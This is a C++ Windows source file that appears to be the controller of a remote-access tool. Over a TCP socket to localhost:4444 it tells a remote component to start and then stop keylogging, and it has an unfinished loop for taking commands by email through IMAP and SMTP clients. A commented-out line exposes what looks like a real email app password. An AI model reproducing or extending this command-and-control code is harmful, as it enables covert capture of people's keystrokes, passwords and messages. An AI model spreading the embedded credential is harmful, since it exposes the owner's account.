#include <iostream>
#include <string>
#include <thread>
#include <cstring>

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include "IMAPClient.h"
#include "SMTPClient.h"
#include "common/Request.h"

using namespace std;

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "4444"

const char* kHost = "localhost";

// const string kAppPass = "bimr unob qhch gwkk";
int send(Request &request, Response &response) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(kHost, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    // Construct request TODO TEST
    // Send an initial buffer
    string sendbuf = request.serialize();
    int total = sendbuf.size();
    int len = 0;
    while ((iResult = send(ConnectSocket, sendbuf.c_str() + len, total - len, 0)) > 0) {
        if (iResult < 0) { 
            cout << "Send error: " <<  WSAGetLastError() << "\n";
            // NOTIFY
            break;
        }

        len += iResult;
    }

    printf("Bytes Sent: %ld / %d\n", len, total);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // Receive until the peer closes the connection
    string buf = "";
    do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        // std::cout << iResult << " result\n";

        if ( iResult > 0 ) { 
            // printf("Bytes received: %d\n", iResult);
            buf += string(recvbuf, iResult);
        } else if ( iResult == 0 )
            printf("Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());

    } while( iResult > 0 );

    cout << "Debug: Received " << buf.size() << " bytes\n";

    response.getParams().clear();
    response.deserialize(buf);

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();
    return 0;
}

void listenToInbox() {
    while (true) {
        // Receive mail

        // Process request

        // Send mail response

        // Add to queue
        // responsesQueue.push();

        // TODO SLOW
        this_thread::sleep_for(2s);
        // thread thread()
    }    
}

int main() {
    Request request;
    request.setAction(ACTION_KEYLOG);
    request.putParam(kSubAction, "Start");
    
    Response response;
    send(request, response);

    this_thread::sleep_for(10s);
     
    request.getParams().clear();
    request.setAction(ACTION_KEYLOG);
    request.putParam(kSubAction, "Stop");
    send(request, response);

    cout << response << "\n";

    return 0;
}